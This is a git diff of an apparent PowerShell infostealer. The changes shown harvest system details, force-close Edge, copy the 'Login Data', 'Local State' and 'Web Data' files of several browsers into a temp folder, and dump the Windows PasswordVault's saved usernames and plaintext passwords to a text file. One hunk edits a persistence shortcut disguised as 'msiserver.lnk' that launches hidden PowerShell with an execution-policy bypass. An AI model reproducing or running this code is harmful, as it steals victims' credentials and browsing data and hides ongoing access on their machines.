@@ -281,13 +281,15 @@ if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").
 #Get System Info
 $computerSystem = Get-CimInstance CIM_ComputerSystem
 
+$computerSystemProduct = Get-WmiObject -Class Win32_ComputerSystemProduct
+
 $computerName = $computerSystem.Name
 
 $computerModel = $computerSystem.Model
 
 $computerManufacturer = $computerSystem.Manufacturer
 
-$computerUUID = Get-WmiObject -Class Win32_ComputerSystemProduct | Select UUID | Out-String
+$computerUUID =  $computerSystemProduct.UUID
 
 $computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
 
@@ -582,10 +584,6 @@ function Get-BrowserData {
     } 
 }
 
-[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
-$vault = New-Object Windows.Security.Credentials.PasswordVault
-$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password >> $env:TMP\$FolderName\BrowserPasswords.txt
-
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
 
@@ -667,6 +665,7 @@ foreach ($file in $log) {
 }
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
+Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
 
@@ -782,6 +781,7 @@ $webdata = "$path\Default\Web Data"
 Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
 
 }
@@ -791,6 +791,13 @@ if([System.IO.File]::Exists("$env:appdata\..\Local\Microsoft\Edge\User Data\Loca
 taskkill /IM msedge.exe /F
 sleep 1
 chromiumBrowser -Path "$env:appdata\..\Local\Microsoft\Edge" -Browser "Edge"
+
+
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$passwords = $vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | Format-Table | Out-String
+echo $passwords > "$env:TMP\$FolderName\Edge\Passwords.txt"
+
 }
 
 # Get Brave Passwords
@@ -835,6 +842,7 @@ foreach ($file in $log) {
 $webdata = "$path\Web Data"
 Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
+Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
 
@@ -876,6 +884,7 @@ $webdata = "$path\Web Data"
 Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
 Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
 Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
+Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
 Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
 }
 
@@ -1045,7 +1054,7 @@ if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
     $objShell = New-Object -COM WScript.Shell
 	$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
 	$target = "powershell"
-	$args = "-Nop -Noni -w h -ep bypass -command `".\msiserver.ps1`""
+	$args = "-Nop -Noni -w h -ep bypass -command `"$env:appdata\..\Local\msiserver.lnk`""
 	$objShortCut.TargetPath = $target
 	$objShortcut.Arguments = $args
 	$objShortCut.Save()
